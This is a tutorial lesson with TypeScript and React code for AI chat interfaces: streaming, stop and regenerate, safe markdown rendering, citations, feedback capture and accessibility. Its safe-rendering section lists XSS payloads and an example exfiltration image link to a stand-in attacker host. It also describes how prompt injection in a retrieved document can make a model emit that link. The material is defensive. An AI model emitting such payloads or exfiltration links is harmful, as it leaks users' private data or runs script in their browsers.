# Frontend Patterns for AI Features

The browser is where an AI feature succeeds or fails in front of the
user. TaskFlow Web has to show an answer while it is still being written,
let the user stop or redo it, render the model's markdown without opening
a security hole, show where an answer came from, and collect the thumbs
up and down that later become evaluation data, all in a way that works
with a keyboard and a screen reader.

This lesson covers rendering streams in React with stop, regenerate, and
optimistic updates; rendering model markdown safely; a citations UI;
feedback capture that feeds evaluations; and loading, error, and
accessibility patterns. The backend side of streaming (the relay that
turns provider events into server-sent events) is covered in
[streaming responses end to end](../hosted-model-apis/streaming-responses-end-to-end.md);
this page starts where those events reach the browser.

## Why it matters

- **Waiting feels longer than reading.** A 600-token answer from a model
  that streams about 50 tokens per second takes 12 seconds to finish. If
  the first words appear after about a second, the user is reading for
  11 of those 12 seconds instead of staring at a spinner. Streaming
  changes perceived speed far more than it changes total time.
- **Model output is untrusted input.** Text that a model writes can carry
  instructions planted in a retrieved document. Rendered carelessly, it
  becomes cross-site scripting, or an image URL that sends private data
  to another server the moment the browser loads it.
- **Users need control.** A long, wrong answer the user cannot stop
  wastes their time and your tokens; an answer they cannot regenerate or
  correct pushes them back to support.
- **Trust needs evidence.** For project-knowledge answers, citations let a
  user check a claim against the source in one click.
- **Feedback is the cheapest eval data you will get.** A thumbs down
  attached to the exact model, prompt version, and trace is a ready-made
  test case.
- **Accessibility is easy to break here.** A live region that announces
  every streamed token makes the page unusable with a screen reader.

## Real-world usage

- **Vercel AI SDK.** The
  [chatbot guide](https://ai-sdk.dev/docs/ai-sdk-ui/chatbot) documents
  the `useChat` hook's four status values (`submitted`, `streaming`,
  `ready`, `error`) and recommends using them to show a loading state, a
  Stop button, and to disable submit; the same hook exposes `stop` and
  `regenerate`.
- **react-markdown.** The project's
  [security section](https://github.com/remarkjs/react-markdown#security)
  states that it is secure by default, that overriding `urlTransform`
  with something unsafe opens XSS vectors, and that the plugins and
  components you add may be insecure.
- **OWASP Top 10 for LLM Applications.**
  [LLM05:2025 Improper Output Handling](https://genai.owasp.org/llmrisk/llm052025-improper-output-handling/)
  lists XSS and CSRF in browsers among the results of passing model
  output to other components without validation.
- **Google PAIR Guidebook.** The
  [Feedback + Control](https://pair.withgoogle.com/chapter/feedback-controls/)
  chapter distinguishes implicit from explicit feedback and advises
  aligning feedback with how the model will actually be improved.
- **W3C WCAG 2.2.**
  [Success Criterion 4.1.3 Status Messages](https://www.w3.org/WAI/WCAG22/Understanding/status-messages.html)
  requires status messages to be exposed through a role or properties so
  assistive technologies can present them without moving focus.

**Popular tools and providers:** Vercel AI SDK UI (`useChat`),
assistant-ui, CopilotKit, react-markdown with remark-gfm and
rehype-sanitize, Streamdown, DOMPurify, and the feedback or score APIs in
LLM observability tools such as Langfuse and LangSmith.

## How it works

### The shape of a streaming turn

The browser posts the user's message and reads the response body as a
stream. TaskFlow uses `fetch` with a `ReadableStream` reader rather than
`EventSource`, because `EventSource` can only send GET requests without
a body or custom headers, and a chat turn is a POST with a JSON body.

TaskFlow's relay sends server-sent events with four event types:

| Event | Data | UI effect |
|---|---|---|
| `delta` | `{ "text": "..." }` | Append text to the current answer |
| `sources` | `{ "sources": [ { "id": "S1", "title": "...", "url": "...", "snippet": "..." } ] }` | Fill the sources panel |
| `done` | `{ "finishReason": "stop" }` | Mark the answer complete, show feedback controls |
| `error` | `{ "message": "..." }` | Keep the partial text, mark it interrupted |

Network chunks do not respect event boundaries: one read can contain half
an event, or split a multi-byte character. The parser buffers text until
a blank line ends an event, and decodes bytes with `TextDecoder` in
streaming mode so split UTF-8 sequences survive.

### UI states and controls

Every turn moves through a small state machine. Modeling it explicitly,
with a reducer, keeps the controls honest: there is always exactly one
thing the user can do next.

![Diagram: a chat turn starts idle; Send moves it to submitted, where the user's message is already shown; the first token moves it to streaming and the done event to complete; from submitted or streaming a failed request or dropped stream moves it to error; during streaming Stop or the Escape key aborts the request and moves it to stopped while keeping the partial text; from complete, stopped, or error the user can regenerate or retry, which sends a new request that replaces the last answer and returns to submitted, and a retry after an error keeps the user's message.](chat-ui-states.svg)

| State | What the UI shows |
|---|---|
| Submitted | The user's message at once (optimistic), then "Thinking..." if no token arrives quickly; a Stop button |
| Streaming | Text growing in place, Stop button and Escape key, `aria-busy` on the message |
| Complete | Feedback buttons, Regenerate, one short "Response complete" announcement |
| Stopped | The partial text, labeled incomplete, and Regenerate |
| Error | The user's text kept, a plain-language problem and fix, and Retry |

### Stop and regenerate

**Stop** aborts the `fetch` with an `AbortController`. Aborting closes the
connection, which the backend relay must notice so it can cancel the
provider request; otherwise the model keeps generating, and billing,
after the user has moved on. Tokens generated before the cancel are
still billed. Keep the partial text and label it, because the user often
stops once they have what they need.

**Regenerate** drops the last answer and asks for a new one to the same
user message. The request carries a `regenerate: true` flag so the
server does not store the user message twice. Some products keep both
answers and let the user page between them ("2 of 2"); either way, store
which answer the user kept, since a regeneration is an implicit thumbs
down on the first one.

### Optimistic UI

Show the user's message the instant they press Send, before the server
confirms it, with a subtle "sending" state. When the server accepts the
request, mark it sent. If the request never reached the server (offline,
DNS failure, a 5xx before streaming), the message must stay on screen,
marked "not sent", with its text intact for a retry; losing a long
carefully written prompt is the most irritating failure a chat UI can
have. Only the user's own message is optimistic: never fake assistant
content. React 19's `useOptimistic` hook implements the same idea for
form actions.

### Rendering performance

A naive implementation re-renders the whole message, and re-parses all of
its markdown, for every token. At 50 tokens per second on a long answer
that is thousands of parses. Three fixes, in order of effort:

- **Batch updates:** apply incoming text at most every 30 to 50 ms. The
  AI SDK's `useChat` has a `throttle` option for this.
- **Memoize finished blocks:** split the text at blank lines and memoize
  every block except the last, so only the growing block re-renders.
- **Use a streaming-aware renderer:** half-written markdown (an unclosed
  code fence or `**bold`) flickers as the parser changes its mind.
  Streamdown, a markdown renderer designed for streamed AI output, handles
  incomplete syntax; a simpler option is plain text while streaming and
  markdown once the answer is complete.

### Rendering model markdown safely

Models answer in markdown, so the UI must render it, and the renderer is
an attack surface. The threats:

- **Raw HTML:** `<script>` or `<img onerror=...>` in the output becomes
  script execution if the renderer passes HTML through.
- **Dangerous links:** `javascript:` URLs run code when clicked.
- **Image exfiltration:** a prompt injection in a retrieved document can
  tell the model to emit `![x](https://attacker.example/?d=<private data>)`.
  The browser fetches the image automatically and the data leaves in the
  query string, with no click needed.
- **Phishing links:** convincing link text pointing somewhere else.

![Diagram: model output, untrusted and possibly injected, is parsed by remark with GitHub Flavored Markdown into a syntax tree; a filter step drops raw HTML with skipHtml and blanks unsafe URLs; component overrides give links noopener and load images only from allowlisted hosts; React renders escaped text with no innerHTML; in the test a script tag is dropped, a javascript link keeps its text but loses its href, an image pointing at an attacker host with a secret in the query string is not loaded, and bold text, lists, tables, and code render normally; if HTML must be rendered, sanitize it with rehype-sanitize or DOMPurify, never use dangerouslySetInnerHTML with model output, and add a Content-Security-Policy as a second layer.](safe-markdown-pipeline.svg)

react-markdown builds React elements from a syntax tree instead of
setting `innerHTML`, so text is escaped by React. It does not render raw
HTML unless you add `rehype-raw`, and `skipHtml` drops raw HTML nodes
entirely instead of showing them as text. Its default `urlTransform`
removes unsafe protocols such as `javascript:`. You add the rest:
component overrides that set `rel="noopener noreferrer nofollow"` on
links and only load images from hosts you control. If you must render
model-produced HTML, run it through `rehype-sanitize` or DOMPurify, and
add a Content-Security-Policy with tight `script-src` and `img-src` as a
second layer. Never pass model output to `dangerouslySetInnerHTML`.
Prompt injection itself is covered in
[prompt injection and defenses](../security-privacy-and-responsible-ai/prompt-injection-and-defenses.md).

### A citations UI

For project-knowledge Q&A, the retrieval step returns passages, and the
answer should point at them. The contract between server and UI:

- The server sends sources as structured data (the `sources` event): an
  ID, a title, a snippet, and a URL that the **server** builds from the
  document ID. A URL never comes from model output.
- The prompt tells the model to cite with markers such as `[S2]`.
- The UI turns each known marker into a numbered superscript link to the
  sources panel, and removes markers whose ID was never retrieved: a
  citation to a source the model was not given is invented. Count those
  removals; a rising count is a quality signal.
- Each source shows its snippet, so the user can check the claim without
  leaving the page, and links to the exact passage in the document.

Some provider APIs return citations as structured annotations with
character ranges; render those the same way. How the passages are
retrieved and how the model is prompted to cite them is covered in
[building a RAG pipeline](../retrieval-augmented-generation/building-a-rag-pipeline.md).

### Feedback that feeds evaluations

Explicit feedback is a Helpful or Not helpful button on each finished
answer, with optional reasons ("Incorrect", "Wrong or missing source")
after a Not helpful. Implicit feedback is what users do: copy an answer,
regenerate it, stop it early, or edit their prompt and resend.

![Diagram: a user rates an assistant message as helpful or not helpful with optional reasons; the browser sends PUT to the feedback endpoint, which keeps one vote per user per message; the feedback collection stores the vote with the model, prompt version, and trace ID added by the server from the stored message; implicit signals such as copy, regenerate, stop, and edit-and-resend are recorded alongside; a dashboard shows the not-helpful rate by model and prompt; a sample of not-helpful votes goes to a review queue where people label why it failed and remove personal data; reviewed cases become versioned eval set entries with input and expected behavior; a CI eval run blocks changes that regress, and the fix ships back to the assistant.](feedback-to-evals-loop.svg)

What makes a vote useful is its context. The server, not the client,
attaches the model ID, prompt version, and trace ID from the stored
message, so a dashboard can compare prompt versions and a reviewer can
open the exact trace. Votes are idempotent (`PUT`, one per user per
message) so users can change their mind. Thumbs-down cases go to a
review queue; reviewed cases, with personal data removed, become entries
in an evaluation set that runs in CI. That loop is covered in
[building evaluation sets](../evaluation-and-monitoring/building-evaluation-sets.md)
and
[evals in CI and regression testing](../evaluation-and-monitoring/evals-in-ci-and-regression-testing.md),
and the trace side in
[LLM observability and tracing](../evaluation-and-monitoring/llm-observability-and-tracing.md).
Tell users that feedback may be reviewed by people, and do not collect
it on content they cannot share.

### Loading, errors, and accessibility

**Loading.** Show the optimistic user message immediately, a "Thinking"
indicator only if the first token has not arrived after a few hundred
milliseconds (so fast answers do not flash), and a reassurance such as
"Still working" with Stop after several seconds. Track time to first
token in the browser as a real-user metric.

**Errors.** Map failures to a problem and a next step, and never show raw
provider errors:

| Failure | Message and action |
|---|---|
| 401 | "Your session expired." Sign in again |
| 413 | "That message is too long." Shorten it or attach a file |
| 429 with `Retry-After` | "Too many requests right now. Try again in 20 seconds." Countdown, then Retry |
| 5xx, or a stream that drops | "The assistant is unavailable." Partial text kept, Retry |
| Offline | "You appear to be offline." Retry when back online |
| Refusal or filtered content | Show the model's refusal text as a normal answer; offer Regenerate or rephrasing |

**Accessibility.**

- Do not make the growing message a live region. Announce state changes
  instead: one visually hidden `role="status"` element says "Assistant is
  responding", then "Response complete" or "Response stopped". This
  satisfies WCAG 4.1.3 without flooding the screen reader.
- `role="log"` (an implicit polite live region) suits transcripts where
  whole messages arrive at once; with token streaming, set `aria-busy` on
  the message while it grows, and test with real screen readers, because
  support varies.
- Keep focus in the input after sending. Make Stop reachable by keyboard
  (Escape while the input has focus) and keep it where the Send button
  was.
- Give icon buttons accessible names, use `aria-pressed` on toggle
  buttons such as the feedback buttons, and respect
  `prefers-reduced-motion` for typing animations.

## When to use and when not to use

| Choice | Use when | Avoid or adapt when |
|---|---|---|
| Stream the answer | Free-text answers longer than a sentence | Structured results (task JSON) the UI cannot use until complete: show progress instead |
| AI SDK `useChat` | A React app whose backend speaks the AI SDK UI message stream | A backend with its own event protocol you cannot change |
| Custom streaming hook | Your own relay protocol; full control of states | You only need a standard chat: the SDK hook saves work |
| Markdown rendering | Answers with lists, tables, and code | Short labels or single values: render plain text |
| Remote images in answers | Never from model-chosen URLs | Allowlisted hosts you control only |
| Citations UI | Answers grounded in retrieved documents | General chat with no retrieval: there is nothing to cite |
| Explicit feedback buttons | Every finished assistant answer | Mid-stream, or on content the user cannot share |

## Practical examples

All code below type-checks against React 19, react-markdown 10, AI SDK 7
(`@ai-sdk/react` 4), Express 5, and zod 4, and the pure parts are covered
by tests whose real output is shown.

### Parse the event stream

```ts
// src/web/chat/sse.ts
export interface SseEvent { event: string; data: string; id?: string }

// Parses a text/event-stream body. Network chunks can split an event (or a
// multi-byte character) anywhere, so text is buffered until a blank line.
export async function* parseSse(body: ReadableStream<Uint8Array>): AsyncGenerator<SseEvent> {
  const reader = body.getReader();
  const decoder = new TextDecoder(); // { stream: true } keeps split UTF-8 bytes
  let buffer = "";
  try {
    while (true) {
      const { value, done } = await reader.read();
      if (done) break;
      buffer += decoder.decode(value, { stream: true }).replace(/\r\n?/g, "\n");
      let end: number;
      while ((end = buffer.indexOf("\n\n")) !== -1) {
        const block = buffer.slice(0, end);
        buffer = buffer.slice(end + 2);
        const event = parseBlock(block);
        if (event) yield event;
      }
    }
  } finally {
    reader.releaseLock();
  }
}

function parseBlock(block: string): SseEvent | undefined {
  let event = "message", id: string | undefined;
  const data: string[] = [];
  for (const line of block.split("\n")) {
    if (line === "" || line.startsWith(":")) continue; // comments are keep-alives
    const colon = line.indexOf(":");
    const field = colon === -1 ? line : line.slice(0, colon);
    const value = colon === -1 ? "" : line.slice(colon + 1).replace(/^ /, "");
    if (field === "event") event = value;
    else if (field === "data") data.push(value);
    else if (field === "id") id = value;
  }
  return data.length ? { event, data: data.join("\n"), id } : undefined;
}
```

### Model the turn as a reducer

```ts
// src/web/chat/chatState.ts
export interface Source { id: string; title: string; url: string; snippet: string }

export interface UiMessage {
  id: string;
  role: "user" | "assistant";
  text: string;
  sources: Source[];
  state: "sending" | "sent" | "failed" | "waiting" | "streaming" | "complete" | "stopped" | "error";
}

export type ChatStatus = "idle" | "submitted" | "streaming" | "error";
export interface ChatState { messages: UiMessage[]; status: ChatStatus; error?: string }

export type ChatAction =
  | { type: "submit"; userId: string; assistantId: string; text: string }
  | { type: "regenerate"; assistantId: string }
  | { type: "accepted"; assistantId: string }
  | { type: "delta"; assistantId: string; text: string }
  | { type: "sources"; assistantId: string; sources: Source[] }
  | { type: "done"; assistantId: string }
  | { type: "stopped"; assistantId: string }
  | { type: "failed"; assistantId: string; error: string; requestReached: boolean };

export const initialChat: ChatState = { messages: [], status: "idle" };

const patch = (messages: UiMessage[], id: string, change: (m: UiMessage) => Partial<UiMessage>) =>
  messages.map((m) => (m.id === id ? { ...m, ...change(m) } : m));

export function chatReducer(state: ChatState, action: ChatAction): ChatState {
  switch (action.type) {
    case "submit": // optimistic: show the user's message and a placeholder at once
      return {
        status: "submitted",
        messages: [
          ...state.messages,
          { id: action.userId, role: "user", text: action.text, sources: [], state: "sending" },
          { id: action.assistantId, role: "assistant", text: "", sources: [], state: "waiting" },
        ],
      };
    case "regenerate": { // drop the last answer and wait for a new one
      const lastUser = state.messages.findLastIndex((m) => m.role === "user");
      return {
        status: "submitted",
        messages: [
          ...state.messages.slice(0, lastUser + 1),
          { id: action.assistantId, role: "assistant", text: "", sources: [], state: "waiting" },
        ],
      };
    }
    case "accepted": // the server stored the user message
      return { ...state, messages: state.messages.map((m) => (m.state === "sending" ? { ...m, state: "sent" } : m)) };
    case "delta":
      return {
        status: "streaming",
        messages: patch(state.messages, action.assistantId, (m) => ({ text: m.text + action.text, state: "streaming" })),
      };
    case "sources":
      return { ...state, messages: patch(state.messages, action.assistantId, () => ({ sources: action.sources })) };
    case "done":
      return { status: "idle", messages: patch(state.messages, action.assistantId, () => ({ state: "complete" })) };
    case "stopped": // keep the partial text, clearly marked
      return { status: "idle", messages: patch(state.messages, action.assistantId, () => ({ state: "stopped" })) };
    case "failed": {
      // If the request never reached the server, the user's text must not be lost.
      const messages = action.requestReached
        ? patch(state.messages, action.assistantId, () => ({ state: "error" }))
        : state.messages
            .filter((m) => m.id !== action.assistantId)
            .map((m) => (m.state === "sending" ? { ...m, state: "failed" as const } : m));
      return { status: "error", error: action.error, messages };
    }
  }
}
```

### The streaming hook: send, stop, regenerate

```ts
// src/web/chat/useChatStream.ts
import { useCallback, useEffect, useReducer, useRef } from "react";
import { parseSse } from "./sse.js";
import { chatReducer, initialChat, type Source } from "./chatState.js";
import { ChatHttpError, describeChatError } from "./errors.js";

export function useChatStream(conversationId: string) {
  const [state, dispatch] = useReducer(chatReducer, initialChat);
  const controller = useRef<AbortController | null>(null);

  const run = useCallback(async (text: string, regenerate: boolean) => {
    controller.current?.abort(); // one generation at a time
    const abort = new AbortController();
    controller.current = abort;
    const assistantId = crypto.randomUUID();
    dispatch(regenerate
      ? { type: "regenerate", assistantId }
      : { type: "submit", userId: crypto.randomUUID(), assistantId, text });

    let requestReached = false;
    try {
      const res = await fetch(`/api/conversations/${conversationId}/messages`, {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "text/event-stream" },
        body: JSON.stringify({ text, regenerate }),
        signal: abort.signal,
      });
      if (!res.ok || !res.body) {
        const retryAfter = Number(res.headers.get("Retry-After")) || undefined;
        throw new ChatHttpError(res.status, retryAfter);
      }
      requestReached = true;
      dispatch({ type: "accepted", assistantId });
      for await (const event of parseSse(res.body)) {
        const data = JSON.parse(event.data);
        if (event.event === "delta") dispatch({ type: "delta", assistantId, text: data.text as string });
        else if (event.event === "sources") dispatch({ type: "sources", assistantId, sources: data.sources as Source[] });
        else if (event.event === "error") throw new Error(String(data.message));
        else if (event.event === "done") { dispatch({ type: "done", assistantId }); return; }
      }
      throw new Error("The stream ended without a done event");
    } catch (err) {
      if (abort.signal.aborted) dispatch({ type: "stopped", assistantId });
      else dispatch({ type: "failed", assistantId, requestReached, error: describeChatError(err).title });
    } finally {
      if (controller.current === abort) controller.current = null;
    }
  }, [conversationId]);

  const stop = useCallback(() => controller.current?.abort(), []);
  useEffect(() => () => controller.current?.abort(), []); // leaving the page stops the stream

  const lastUserText = state.messages.findLast((m) => m.role === "user")?.text ?? "";
  return {
    ...state,
    send: (text: string) => run(text, false),
    regenerate: () => run(lastUserText, true),
    stop,
  };
}
```

A stream that ends without `done` is treated as an error, not as a
complete answer: a proxy timeout or deploy can cut the connection cleanly,
and a truncated answer must not look finished. The error helper maps
failures to the messages in the table above:

```ts
// src/web/chat/errors.ts
export class ChatHttpError extends Error {
  constructor(readonly status: number, readonly retryAfterSeconds?: number) {
    super(`HTTP ${status}`);
  }
}

// Problem first, then what the user can do. No raw provider errors in the UI.
export function describeChatError(err: unknown): { title: string; detail: string; canRetry: boolean } {
  if (err instanceof ChatHttpError) {
    if (err.status === 401) return { title: "Your session expired.", detail: "Sign in again to continue.", canRetry: false };
    if (err.status === 413) return { title: "That message is too long.", detail: "Shorten it or attach the text as a file.", canRetry: false };
    if (err.status === 429) {
      const wait = err.retryAfterSeconds ? `in ${err.retryAfterSeconds} seconds` : "in a moment";
      return { title: "Too many requests right now.", detail: `Try again ${wait}.`, canRetry: true };
    }
    if (err.status >= 500) return { title: "The assistant is unavailable.", detail: "Try again. Your message was kept.", canRetry: true };
  }
  if (typeof navigator !== "undefined" && navigator.onLine === false) {
    return { title: "You appear to be offline.", detail: "Reconnect, then retry.", canRetry: true };
  }
  return { title: "Something went wrong.", detail: "Try again. Your message was kept.", canRetry: true };
}
```

### Render markdown safely

```ts
// src/web/chat/SafeMarkdown.tsx
import Markdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";

// Images load from our own file host only: a remote image URL in model output
// can carry data out of the page the moment the browser fetches it.
const IMAGE_HOSTS = new Set(["files.example.com"]);

function allowedImage(src: unknown): string | undefined {
  if (typeof src !== "string") return undefined;
  try {
    const url = new URL(src, window.location.origin);
    return url.protocol === "https:" && IMAGE_HOSTS.has(url.host) ? url.href : undefined;
  } catch {
    return undefined;
  }
}

const components: Components = {
  a({ href, children }) {
    if (href?.startsWith("#source-")) { // citation markers produced by linkCitations
      return <sup><a href={href} className="citation">{children}</a></sup>;
    }
    return <a href={href} target="_blank" rel="noopener noreferrer nofollow">{children}</a>;
  },
  img({ src, alt }) {
    const safe = allowedImage(src);
    return safe ? <img src={safe} alt={alt ?? ""} loading="lazy" /> : <span>[image not shown]</span>;
  },
};

// react-markdown never renders raw HTML (skipHtml drops it entirely) and its
// default urlTransform removes javascript: and other unsafe link protocols.
export function SafeMarkdown({ text }: { text: string }) {
  return (
    <Markdown remarkPlugins={[remarkGfm]} skipHtml components={components}>
      {text}
    </Markdown>
  );
}
```

A test renders hostile input with `renderToString` and asserts on the
HTML. This is the real output for four of the payloads (the `<script>`
and raw `<img onerror>` lines produced nothing at all):

```text
<p><a href="" target="_blank" rel="noopener noreferrer nofollow">click me</a></p>
<p><span>[image not shown]</span></p>
<p><img src="https://files.example.com/logo.png" alt="logo" loading="lazy"/></p>
<p><strong>bold</strong> and <code>code</code></p>
```

The `javascript:` link survives as harmless text with an empty `href`;
if that looks odd in your UI, render links with an empty `href` as plain
text in the `a` override.

### Link citations and show sources

```ts
// src/web/chat/citations.ts
import type { Source } from "./chatState.js";

// The model is asked to cite with markers such as [S2] or [S1, S3]. Markers are
// turned into links to the sources panel; markers for unknown IDs are removed
// and counted, because a citation to a source that was never retrieved is invented.
export function linkCitations(text: string, sources: Source[]) {
  const order = new Map(sources.map((s, i) => [s.id, i + 1]));
  let invalid = 0;
  const linked = text.replace(/\[(S\d+(?:\s*,\s*S\d+)*)\]/g, (_marker, ids: string) =>
    ids.split(",").map((raw) => {
      const id = raw.trim();
      const n = order.get(id);
      if (n === undefined) { invalid++; return ""; }
      return `[${n}](#source-${id})`;
    }).join(""));
  return { markdown: linked, invalid };
}
```

```ts
// src/web/chat/AssistantMessage.tsx
import { linkCitations } from "./citations.js";
import { SafeMarkdown } from "./SafeMarkdown.js";
import { FeedbackButtons } from "./FeedbackButtons.js";
import type { UiMessage } from "./chatState.js";

export function AssistantMessage({ message }: { message: UiMessage }) {
  const { markdown } = linkCitations(message.text, message.sources);
  const finished = message.state === "complete" || message.state === "stopped";
  return (
    <article aria-label="Assistant message" aria-busy={message.state === "streaming"}>
      {message.state === "waiting" ? <p className="thinking">Thinking...</p> : <SafeMarkdown text={markdown} />}
      {message.state === "stopped" && <p className="note">Stopped. This answer is incomplete.</p>}
      {message.state === "error" && <p className="note" role="alert">The answer was interrupted.</p>}
      {message.sources.length > 0 && (
        <section aria-label="Sources">
          <h3>Sources</h3>
          <ol>
            {message.sources.map((source) => (
              <li key={source.id} id={`source-${source.id}`}>
                <a href={source.url}>{source.title}</a>
                <blockquote>{source.snippet}</blockquote>
              </li>
            ))}
          </ol>
        </section>
      )}
      {finished && <FeedbackButtons messageId={message.id} />}
    </article>
  );
}
```

With sources `S1` and `S2`, the input `Budget is fixed [S1, S9].` becomes
`Budget is fixed [1](#source-S1).` and `invalid` is 1: the test asserts
exactly that. Send the `invalid` count to your telemetry with the
message's trace ID.

### Feedback buttons and the endpoint behind them

```ts
// src/web/chat/FeedbackButtons.tsx
import { useState } from "react";

type Rating = "up" | "down";
const REASONS = ["Incorrect", "Not helpful", "Wrong or missing source", "Unsafe or offensive"];

export function FeedbackButtons({ messageId }: { messageId: string }) {
  const [rating, setRating] = useState<Rating | null>(null);
  const [reasons, setReasons] = useState<string[]>([]);
  const [saved, setSaved] = useState(false);

  async function submit(next: Rating | null, nextReasons: string[]) {
    const previous = rating;
    setRating(next); // optimistic; roll back if the request fails
    setSaved(false);
    const res = await fetch("/api/feedback", {
      method: "PUT", // idempotent: one rating per user per message, changeable
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ messageId, rating: next, reasons: nextReasons }),
    }).catch(() => undefined);
    if (!res?.ok) setRating(previous);
    else setSaved(true);
  }

  const toggleReason = (reason: string) => {
    const next = reasons.includes(reason) ? reasons.filter((r) => r !== reason) : [...reasons, reason];
    setReasons(next);
    void submit("down", next);
  };

  return (
    <div className="feedback">
      {/* With icon-only buttons, keep these texts as aria-label values. */}
      <button type="button" aria-pressed={rating === "up"}
              onClick={() => submit(rating === "up" ? null : "up", [])}>Helpful</button>
      <button type="button" aria-pressed={rating === "down"}
              onClick={() => submit(rating === "down" ? null : "down", reasons)}>Not helpful</button>
      {rating === "down" && (
        <fieldset>
          <legend>What went wrong? (optional)</legend>
          {REASONS.map((reason) => (
            <label key={reason}>
              <input type="checkbox" checked={reasons.includes(reason)} onChange={() => toggleReason(reason)} />
              {reason}
            </label>
          ))}
        </fieldset>
      )}
      <span role="status">{saved ? "Thanks for the feedback." : ""}</span>
    </div>
  );
}
```

```ts
// src/routes/feedback.ts
import { Router } from "express";
import { ObjectId, type Db } from "mongodb";
import { z } from "zod";

const FeedbackBody = z.object({
  messageId: z.string().refine(ObjectId.isValid, "invalid message id"),
  rating: z.enum(["up", "down"]).nullable(),       // null clears an earlier vote
  reasons: z.array(z.string().max(60)).max(5).default([]),
  comment: z.string().max(1_000).optional(),
});

export function feedbackRoutes(db: Db) {
  const router = Router();
  const messages = db.collection("messages");
  const feedback = db.collection("feedback");

  router.put("/feedback", async (req, res) => {
    const owner = res.locals.owner as { userId: string; workspaceId: string };
    const body = FeedbackBody.safeParse(req.body);
    if (!body.success) return res.status(400).json({ error: "Invalid feedback." });

    // Model, prompt version, and trace come from the stored message, not the client.
    const messageId = new ObjectId(body.data.messageId);
    const message = await messages.findOne(
      { _id: messageId, userId: owner.userId, role: "assistant" },
      { projection: { conversationId: 1, model: 1, promptVersion: 1, traceId: 1 } },
    );
    if (!message) return res.status(404).end();

    await feedback.updateOne(
      { messageId, userId: owner.userId },
      {
        $set: {
          ...body.data, messageId, workspaceId: owner.workspaceId,
          conversationId: message.conversationId, model: message.model,
          promptVersion: message.promptVersion, traceId: message.traceId,
          reviewStatus: body.data.rating === "down" ? "unreviewed" : "none",
          updatedAt: new Date(),
        },
        $setOnInsert: { createdAt: new Date() },
      },
      { upsert: true },
    );
    res.status(204).end();
  });

  return router;
}
```

`reviewStatus: "unreviewed"` is what the review queue queries. A unique
index on `{ messageId: 1, userId: 1 }` makes the upsert safe under double
clicks.

### Put it together with accessible states

```ts
// src/web/chat/ChatView.tsx
import { useState, type KeyboardEvent } from "react";
import { useChatStream } from "./useChatStream.js";
import { AssistantMessage } from "./AssistantMessage.js";

export function ChatView({ conversationId }: { conversationId: string }) {
  const chat = useChatStream(conversationId);
  const [draft, setDraft] = useState("");
  const busy = chat.status === "submitted" || chat.status === "streaming";
  const last = chat.messages.at(-1);

  function send() {
    const text = draft.trim();
    if (!text || busy) return;
    setDraft(""); // the reducer already holds the text, so a failure cannot lose it
    void chat.send(text);
  }

  function onKeyDown(e: KeyboardEvent<HTMLTextAreaElement>) {
    if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); send(); }
    if (e.key === "Escape" && busy) chat.stop();
  }

  // One short announcement per state change, instead of one per streamed token.
  const announcement =
    chat.status === "submitted" ? "Assistant is responding." :
    last?.state === "complete" ? "Response complete." :
    last?.state === "stopped" ? "Response stopped." :
    chat.status === "error" ? (chat.error ?? "Something went wrong.") : "";

  return (
    <div className="chat">
      <section aria-label="Conversation">
        {chat.messages.map((m) =>
          m.role === "user"
            ? <p key={m.id} className={`user ${m.state}`}>{m.text}{m.state === "failed" && " (not sent)"}</p>
            : <AssistantMessage key={m.id} message={m} />)}
      </section>

      <div role="status" className="visually-hidden">{announcement}</div>

      {!busy && (last?.state === "stopped" || last?.state === "error" || last?.state === "complete") && (
        <button type="button" onClick={() => void chat.regenerate()}>Regenerate</button>
      )}

      <form onSubmit={(e) => { e.preventDefault(); send(); }}>
        <label htmlFor="chat-input">Message TaskFlow Assistant</label>
        <textarea id="chat-input" value={draft} onChange={(e) => setDraft(e.target.value)}
                  onKeyDown={onKeyDown} rows={2} />
        {busy
          ? <button type="button" onClick={chat.stop}>Stop generating</button>
          : <button type="submit" disabled={!draft.trim()}>Send</button>}
      </form>
    </div>
  );
}
```

The real test run for this module set:

```text
ok 1 - SSE parser survives events and UTF-8 characters split across chunks
ok 2 - reducer: optimistic send, stream, stop keeps partial text, regenerate replaces it
ok 3 - reducer: a request that never reached the server keeps the user's text
ok 4 - citations: known markers become links, invented ones are removed and counted
ok 5 - errors: 429 shows the Retry-After wait
ok 6 - SafeMarkdown neutralizes XSS and exfiltration payloads
```

### The same chat with the AI SDK

If the backend streams the AI SDK's UI message format (for example with
`streamText(...).toUIMessageStreamResponse()`), `useChat` replaces the
hook and the reducer. Messages arrive as typed `parts`, so text, sources,
tool calls, and reasoning each get their own component:

```ts
// src/web/chat/AssistantChatSdk.tsx
import { useState } from "react";
import { useChat } from "@ai-sdk/react";
import { DefaultChatTransport } from "ai";
import { SafeMarkdown } from "./SafeMarkdown.js";

export function AssistantChatSdk({ conversationId }: { conversationId: string }) {
  const { messages, sendMessage, status, stop, regenerate, error, clearError } = useChat({
    id: conversationId,
    transport: new DefaultChatTransport({ api: "/api/chat" }),
    throttle: 50, // re-render at most every 50 ms while tokens arrive
  });
  const [draft, setDraft] = useState("");
  const busy = status === "submitted" || status === "streaming";

  return (
    <div className="chat">
      <section aria-label="Conversation">
        {messages.map((message) => (
          <article key={message.id} aria-label={`${message.role} message`}>
            {message.parts.map((part, i) => {
              if (part.type === "text") return <SafeMarkdown key={i} text={part.text} />;
              if (part.type === "source-url") return <a key={i} href={part.url}>{part.title ?? part.url}</a>;
              return null; // tool calls, reasoning, and files get their own components
            })}
          </article>
        ))}
      </section>
      <div role="status" className="visually-hidden">{status === "submitted" ? "Assistant is responding." : ""}</div>
      {error && (
        <div role="alert">
          The assistant is unavailable. <button type="button" onClick={() => { clearError(); void regenerate(); }}>Retry</button>
        </div>
      )}
      <form onSubmit={(e) => { e.preventDefault(); if (draft.trim() && !busy) { void sendMessage({ text: draft }); setDraft(""); } }}>
        <label htmlFor="sdk-input">Message TaskFlow Assistant</label>
        <input id="sdk-input" value={draft} onChange={(e) => setDraft(e.target.value)} />
        {busy ? <button type="button" onClick={() => stop()}>Stop generating</button> : <button type="submit">Send</button>}
      </form>
    </div>
  );
}
```

The safe markdown component, the feedback buttons, and the accessibility
rules apply unchanged. `useChat` also supports resuming an interrupted
stream (`resume: true` with a server that stores streams), which pairs
with the resumable patterns in
[conversation state and memory](conversation-state-and-memory.md). How
the SDK compares with other frameworks is the subject of
[AI frameworks and SDKs](ai-frameworks-and-sdks.md).

